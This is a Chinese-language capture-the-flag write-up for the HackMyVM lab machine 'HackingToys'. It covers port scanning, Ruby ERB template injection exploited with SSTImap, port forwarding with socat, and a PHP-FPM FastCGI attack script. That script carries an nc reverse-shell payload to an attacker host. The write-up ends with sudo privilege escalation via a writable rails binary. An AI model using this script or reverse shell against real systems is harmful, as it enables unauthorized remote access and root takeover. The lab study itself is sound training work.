---
title: HackMyVM-HackingToys
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# HackingToys.

> https://hackmyvm.eu/machines/machine.php?vm=HackingToys
> 

Notes: **Enjoy it.**

## 信息收集

`21`是靶机

```bash
┌──(root㉿kali)-[~]
└─# nmap -sP 192.168.56.0/24                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 08:05 EST
Nmap scan report for 192.168.56.1
Host is up (0.00055s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00050s latency).
MAC Address: 08:00:27:EE:CF:66 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.21
Host is up (0.00039s latency).
MAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)
```

```bash
┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.56.21   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 08:06 EST
Nmap scan report for 192.168.56.21
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.21 seconds
```

```bash
┌──(root㉿kali)-[~]                                                           
└─# nmap -sT -A -T4 -O -P 22,3000 192.168.56.21                               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 08:07 EST                                                                                           
Failed to resolve "22,3000".                                                  
Nmap scan report for 192.168.56.21                                            
Host is up (0.00060s latency).                                                
Not shown: 998 closed tcp ports (conn-refused)                                
PORT     STATE SERVICE  VERSION                                               
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)     
| ssh-hostkey:                                                                
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)           
|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)             
3000/tcp open  ssl/ppp?                                                       
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR
| Not valid before: 2024-05-20T15:36:20                                       
|_Not valid after:  2038-01-27T15:36:20                                       
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)                
Device type: general purpose                                                                                                                                 
Running: Linux 4.X|5.X                                                        
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5               
OS details: Linux 4.15 - 5.8                                                  
Network Distance: 1 hop                                                       
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                       
                                                                              
TRACEROUTE                                                                    
HOP RTT     ADDRESS                                                                                                                                          
1   0.60 ms 192.168.56.21                                                                                                                                    
                                                                                                                                                             
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                        
Nmap done: 1 IP address (1 host up) scanned in 82.79 seconds  
```

```bash
┌──(root㉿kali)-[~]
└─# nmap -script=vuln -p 22,3000 192.168.56.21  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 08:10 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.21
Host is up (0.00067s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 84.46 seconds

```

`3000`是未知端口,该端口被检测为可能使用 SSL 加密，但实际上 SSL 连接解析失败。提示服务是 **Puma**，一个常用于 `Ruby on Rails` 应用的 Web 服务器。

那么优先级 `3000` > `22`

## 前期踩点

访问`3000`端口主页，要使用`https`来访问

![image.png](image%2070.png)

看一下指纹信息，和`nmap`扫描的结果一样，`Ruby on Rails` 应用的 Web 服务器

![image.png](image%2071.png)

点击超链接，可以发现是通过`https://192.168.56.21:3000/products/show/1` 最后边的数字来跳转的

当数字超过`5`后，则会报错，应该是`debug`没有关闭

![image.png](image%2072.png)

尝试了下目录爆破，但是速度很慢，可能是对请求数量做了限制

浏览一下是否存在`robots.txt`文件，存在，内容如下（robots.txt 文件规范说明来自官方网站 `robotstxt.org`，很多网站开发者直接引用）

```bash
# See https://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file
```

![image.png](image%2073.png)

尝试网上的目录穿越漏洞，无果

存在`XSS`，但是没办法利用

![image.png](image%2074.png)

## SSTI 模板注入

经过测试，测试出来了个`SSTI` ，`message`上的编码解码后是：`<%= self.methods %>`

![image.png](image%2075.png)

使用`SSTImap`来梭哈

```bash
┌──(root㉿kali)-[~/Desktop/Tools/SSTImap]
└─# ./sstimap.py -u "https://192.168.56.21:3000/search?message=*&query=1"
[+] Erb plugin has confirmed injection with tag '*' 
[+] SSTImap identified the following injection point:

  Query parameter: message
  Engine: Erb
  Injection: *
  Context: text
  OS: x86_64-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, ruby code

[+] Rerun SSTImap providing one of the following options:
    --interactive                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port.
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
    --upload LOCAL REMOTE        Upload files to the server.
    --download REMOTE LOCAL      Download remote files.
```

直接`--os-shell` 拿到`shell`

```bash
[+] SSTImap identified the following injection point:

  Query parameter: message
  Engine: Erb
  Injection: *
  Context: text
  OS: x86_64-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, ruby code

[+] Run commands on the operating system.
x86_64-linux $ 
```

## 靶机信息收集

```bash
x86_64-linux $ id
uid=1000(lidia) gid=1000(lidia) groups=1000(lidia),100(users),1002(rvm)

x86_64-linux $ uname -a
Linux hacktoys 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux

x86_64-linux $ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:72:0c:9a brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.21/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 399sec preferred_lft 399sec
    inet6 fe80::a00:27ff:fe72:c9a/64 scope link 
       valid_lft forever preferred_lft forever

```

属于`rvm`组，用户 `lidia` 可以管理和使用 `RVM` 环境，这意味着她可能拥有对 `Ruby` 版本和 `Gem` 包管理的权限

因为`SSTImap`获得的`shell` ，有限制我们将其反弹到了`kali`上（省略反弹步骤）

存在`master.key`所以可以查看`credentials.yml.enc` ，只能看到有`secret_key_base`

```bash
/opt/app/gadgets/config$ rails credentials:show
rails credentials:show
# aws:
#   access_key_id: 123
#   secret_access_key: 345

# Used as the base secret for all MessageVerifiers in Rails, including the one protecting cookies.
secret_key_base: 580d52cd8ed1b40e6d69f01c9e519e55ca47dd464083320f7452179b9fbf22f7ce2bd914671a698d0e35c91fab990368625afc99ff3b4b0f1960359f56b444e8
```

在`/var/www/html`中发现有内容，但是`3000`端口的服务是在`/opt/app/gadgets/` 目录下的

查看一下当前网络连接信息，存在`http`端口

```bash
lidia@hacktoys:/var/www/html$ ss -tulp
Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess                       
udp   UNCONN 0      0            0.0.0.0:bootpc      0.0.0.0:*                                 
tcp   LISTEN 0      4096       127.0.0.1:9000        0.0.0.0:*                                 
tcp   LISTEN 0      128          0.0.0.0:ssh         0.0.0.0:*                                 
tcp   LISTEN 0      511        127.0.0.1:http        0.0.0.0:*                                 
tcp   LISTEN 0      1024         0.0.0.0:3000        0.0.0.0:*    users:(("ruby",pid=499,fd=7))
tcp   LISTEN 0      128             [::]:ssh            [::]:*                                 

```

我们将其使用`socat`转发出去

```bash
./socat TCP-LISTEN:8888,fork TCP4:127.0.0.1:80 &
```

## 80 端口（兔子洞）

访问页面，主页是要用邮箱登录的

![image.png](image%2076.png)

我们直接看源码，没看出来什么（兔子洞）

```bash
lidia@hacktoys:/var/www/html$ ls -al
total 36
drwxr-xr-x 5 dodi dodi 4096 May 21  2024 .
drwxr-xr-x 3 root root 4096 May 20  2024 ..
-rw-r--r-- 1 dodi root 1018 May 21  2024 coming-soon2.css
-rw-r--r-- 1 dodi root 1680 May 21  2024 coming-soon2.html
drwxr-xr-x 8 root root 4096 May 21  2024 .git
drwxr-xr-x 2 dodi root 4096 May 21  2024 img
-rw-r--r-- 1 dodi root 3633 May 21  2024 index.php
-rw-r--r-- 1 dodi root 2015 May 21  2024 style.css
drwxr-xr-x 2 root root 4096 May 21  2024 .vscode
```

注意到还有个`.git`文件夹，使其直接信任该目录，如何`git log`查看历史

```bash
# 让其信任信任该文件夹
lidia@hacktoys:/var/www/html$ git config --global --add safe.directory /var/www/html
```

```bash
lidia@hacktoys:/var/www/html$ git log                                         
git log                                                                       
commit c28e2672361c2ca3e1ee49bbcba89c3c68a771f1                       
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>
Date:   Sat Aug 12 19:35:55 2023 +0530 
                                                                              
    Rename coming-soon.component.css to coming-soon2.css
                                                                              
commit c201b438dc21023bcf85ea6bf3055d4331c26968                       
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>
Date:   Sat Aug 12 19:35:20 2023 +0530                                        
                                       
    Rename coming-soon.component.html to coming-soon2.html              
                                                                              
commit 9d4a0977e779d7be10823d5c9af269a3287838ba                       
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>
Date:   Sat Aug 12 19:34:21 2023 +0530                                                                                                                       
                                                                              
    Update coming-soon2.html           
                                                                              
commit 8d1db3b19e8bcc69c03477975dd3d8c756037ad7                       
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>
Date:   Sat Aug 12 19:31:54 2023 +0530                                        
                                       
    Added Another coming soon template
                                                                              
commit f47c5a98979d0f675b7fe490b7d28386f94b5a72                      
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>        
Date:   Tue Aug 1 13:46:36 2023 +0530                                         
                                                                                                                                                             
    Update index.html  
commit efe8ad58208498bf9fe4a8fe0b709dd330ea0527                               
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>
Date:   Thu Sep 16 08:41:40 2021 +0530                                        
                                       
    Delete logo img                                                           
                                                                              
commit a3820cf829ee5e0245bb715e9eae0d3effb5caa4                               
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>
Date:   Thu Sep 16 08:38:04 2021 +0530                                        
                                                                              
    Update some information.           
                                                                              
commit 439b881889a63a1dcd1c18a1315585d10ff89382                               
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>
Date:   Sun Sep 12 13:54:09 2021 +0530                                        
                                                                                                                                                             
    Update README.md                                                          
                                       
commit 208830141b773545f190ef209d7d1b4119b8f21b                               
Author: Vishal pandey <70359874+vishalps2606@users.noreply.github.com>
Date:   Sun Sep 12 13:49:53 2021 +0530                                        
                                                                              
    Create Readme                      
                                       
commit f51d1f17fb9e67698189dc845fbf8bf3657f46ad                               
Author: vishalps2606 <70359874+vishalps2606@users.noreply.github.com>
Date:   Sun Sep 12 12:08:36 2021 +0530                                        
                                                                              
    First commit                                              
```

也没什么发现，好像也是兔子洞…

## PHP FastCGI

我们还注意到查看网络信息的时候还存在`9000`端口

```bash
lidia@hacktoys:/var/www/html$ ss -tulp
Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess                       
udp   UNCONN 0      0            0.0.0.0:bootpc      0.0.0.0:*                                 
tcp   LISTEN 0      4096       127.0.0.1:9000        0.0.0.0:*                                 
tcp   LISTEN 0      128          0.0.0.0:ssh         0.0.0.0:*                                 
tcp   LISTEN 0      511        127.0.0.1:http        0.0.0.0:*                                 
tcp   LISTEN 0      1024         0.0.0.0:3000        0.0.0.0:*    users:(("ruby",pid=499,fd=7))
tcp   LISTEN 0      128             [::]:ssh            [::]:*                                 
```

**PHP-FPM（FastCGI Process Manager）**

- **用途:** 提供 `PHP` 的 `FastCGI` 服务，通常与 `NGINX` 或 `Apache` 配合使用。
- **默认端口:** `9000`

先将其使用`socat`转发出来

```bash
./socat TCP-LISTEN:9001,fork TCP4:127.0.0.1:9000 &
```

再使用`nmap`扫描，能扫到了

```bash
┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.56.21
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 10:42 EST
Stats: 0:00:04 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 192.168.56.21
Host is up (0.0014s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
8888/tcp open  sun-answerbook
9001/tcp open  tor-orport
MAC Address: 08:00:27:72:0C:9A (Oracle VirtualBox virtual NIC)
```

网上说存在远程`RCE`漏洞

> https://exploit-notes.hdks.org/exploit/network/fastcgi-pentesting/ 使用这里的脚本
> 

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.4 1234 >/tmp/f'); echo '-->';"
FILENAMES="/var/www/html/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

如何`kali`开启监听`1234`端口，执行脚本

```bash
┌──(root㉿kali)-[~/Desktop/test/Hackingtoy]
└─# ./exp.sh 192.168.56.21:9001
```

成功获得`shell`

```bash
┌──(root㉿kali)-[~]
└─# nc -lvp 1234         
listening on [any] 1234 ...
192.168.56.21: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.21] 53854
/bin/sh: 0: can't access tty; job control turned off
$ $ id
uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)
```

## 提权

查看其权限

```bash
$ sudo -l
Matching Defaults entries for dodi on hacktoys:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dodi may run the following commands on hacktoys:
    (ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh
    
$ ls -al /usr/local/bin/rvm_rails.sh
-rwxr-xr-x 1 root root 660 May 20  2024 /usr/local/bin/rvm_rails.sh
```

可以以`Root`权限执行`rvm_rails.sh`脚本，但是没有修改权限

注意到`exec /usr/local/rvm/gems/ruby-3.1.0/bin/rail` 执行文件，并且目录是`rvm` ，上一个用户是属于`rvm` 组的，所以可能存在修改权限

```bash
$ cat /usr/local/bin/rvm_rails.sh
#!/bin/bash
export rvm_prefix=/usr/local
export MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0
export RUBY_VERSION=ruby-3.1.0
export rvm_version=1.29.12
export rvm_bin_path=/usr/local/rvm/bin
export GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global
export GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0
export PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin
export IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc
export rvm_path=/usr/local/rvm
exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails "$@"
```

查看权限，拥有修改权限

```bash
lidia@hacktoys:~$ ls -al /usr/local/rvm/gems/ruby-3.1.0/bin/rails
-rwxrwxr-x 1 root rvm 566 May 20  2024 /usr/local/rvm/gems/ruby-3.1.0/bin/rails
```

往里边添加提权语句

```bash
echo "/bin/bash" > /usr/local/rvm/gems/ruby-3.1.0/bin/rails
```

回到`dodi`用户，执行文件，获得`Root`

```bash
$ sudo /usr/local/bin/rvm_rails.sh
id
uid=0(root) gid=0(root) groups=0(root),1002(rvm)
```

## RootFlag & UserFlag

```bash
cat /root/root.txt
64aa5a7aaf42af74ee6b59d5ac5c1509
cat /home/dodi/user.txt
b075b24bdb11990e185c32c43539c39f
```

## 总结

第一次遇到`Ruby`的模板注入，学习到如何辨识，以及`Nginx`和`PHP FPM`一块可能存在漏洞，但是默认`nmap`是扫描不到的